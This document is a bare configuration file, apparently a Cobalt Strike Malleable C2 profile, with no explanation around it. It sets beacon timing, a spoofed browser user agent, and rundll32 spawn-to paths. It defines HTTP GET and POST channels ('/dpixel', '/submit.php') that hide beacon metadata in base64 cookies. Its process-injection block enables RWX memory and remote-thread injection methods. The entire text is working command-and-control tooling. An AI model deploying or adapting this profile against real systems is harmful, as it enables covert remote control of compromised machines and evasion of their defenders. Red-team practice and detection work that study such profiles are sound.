set sleeptime "60000";
set jitter "0";
set spawnto_x86 "%windir%\syswow64\rundll32.exe";
set spawnto_x64 "%windir%\sysnative\rundll32.exe";
set useragent "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko";

http-get {
    set uri "/dpixel";
    set verb "GET";

    server {

        output {
            print;
        }
    }

    client {

        metadata {
            base64;
            header "Cookie";
        }
    }
}

http-post {
    set verb "POST";
    set uri "/submit.php";

    client {
        header "Content-Type" "application/octet-stream";

        id {
            parameter "id";
        }

        output {
            print;
        }
    }
}

stage {
    set cleanup "0";
    set data_store_size "16";
}

process-inject {
    set startrwx "true";
    set userwx "true";

    execute {
        CreateThread;
        SetThreadContext;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
    set allocator "VirtualAllocEx";
    set bof_reuse_memory "true";
    set bof_allocator "VirtualAlloc";
}
